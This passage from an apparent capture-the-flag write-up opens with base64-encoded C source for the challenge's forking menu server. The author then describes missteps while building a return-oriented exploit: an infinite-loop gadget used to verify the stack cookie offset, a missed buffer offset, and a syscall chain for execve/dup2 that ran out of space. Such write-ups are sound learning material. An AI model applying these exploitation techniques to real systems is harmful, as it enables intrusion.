dHNvY2tvcHQoaW5pdF9mZCxTT0xfU09DS0VULFNPX1JFVVNFQUREUiwmbXlpbnQsc2l6ZW9mKG15 aW50KSkgPT0gLTEpewogICAgcGVycm9yKCJzZXRzb2NrZXQiKTsKICAgICAgZXhpdCgtMSk7CiAg fSAgIAogIAogIHNlcnZlci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsKICBzZXJ2ZXIuc2luX2FkZHIu c19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7CiAgc2VydmVyLnNpbl9wb3J0ID0gaHRvbnMoYXRv aShhcmd2WzFdKSk7ICAgCgogIGlmIChiaW5kKGluaXRfZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikg JnNlcnZlciwgc2l6ZW9mKHNlcnZlcikpID09IC0xKSB7CiAgICAgcGVycm9yKCJiaW5kIik7CiAg ICAgZXhpdCgtMSk7CiAgfSAgIAogIAogIGlmKChsaXN0ZW4oaW5pdF9mZCwyMCkpID09IC0xKXsK ICAgICBwZXJyb3IoImxpc3RlbiIpOwogICAgIGV4aXQoLTEpOwogIH0gICAKICBpbnQgYWRkcl9s ZW4gPSBzaXplb2YoY2xpZW50KTsgICAKCiAgIHdoaWxlICgxKSB7ICAgICAgCgogICAgICAgIGlu dCBmZCA9IGFjY2VwdChpbml0X2ZkLChzdHJ1Y3Qgc29ja2FkZHIgKikmY2xpZW50LChzb2NrbGVu X3QqKSZhZGRyX2xlbik7ICAgICAgCgogICAgIGlmIChmZCA8IDApIHsKICAgICAgICBwZXJyb3Io ImFjY2VwdCIpOwogICAgICAgIGV4aXQoMSk7CiAgICAgfSAgICAgIAogICAgIHBpZF90IHBpZCA9 IGZvcmsoKTsgICAgICAKICAgICAKICAgICBpZiAocGlkID09IC0xKSB7CiAgICAgICBwZXJyb3Io ImZvcmsiKTsKICAgICAgIGNsb3NlKGZkKTsgICAgICAKICAgICB9CiAgICAgIAogICAgIGlmIChw aWQgPT0gMCl7CgkgIGFsYXJtKDE1KTsKICAgICAgICAgIGNsb3NlKGluaXRfZmQpOwoJICBpbnQg dXNlcl9wcml2ID0gcHJpdigidHV0b3JpYWwiKTsKCSAgaWYoIXVzZXJfcHJpdil7CiAgICAgICAg ICAJbWVudShmZCk7CgkJY2xvc2UoZmQpOwoJICAgICAgICBleGl0KDApOwoJICB9CiAgICAgfWVs c2V7CiAgICAgICAgICAgIGNsb3NlKGZkKTsKICAgICAgfSAgIAoKICAgIH0KICBjbG9zZShpbml0 X2ZkKTsKfQoK $
```

## Detours I took (without the benefit of hindsight)
- I wasn't able to get the binary running locally, due to environment mismatches in addition to the different libc version. In order to debug the exploit, I used an gadget that goes into an infinite loop ("\xeb\xfe", which jumps to itself). This allows distinguishing a successful return address overwrite from a crash, and is how I dynamically verified the offset of the cookie.

- I also initially just skimmed `func1` and missed the -0x500, which took a few hours to debug (and was eventually corrected by a teammate). This was made more difficult by the lack of local debugging (the symptoms of trying to use ebfe's to debug is just that it never hit the correct offset, and just crashed instead of hanging).

- I also initially tried to use a "syscall; ret" gadget to invoke execve/dup2 manually. This failed due to running out of space ((0x1cc - 0x144)/8 is 17 words, which is kind of tight). I caught this by interleaving ebfe's with the other calls (some interleavings hung, some crashed, the ones that crashed had the ebfe's later).
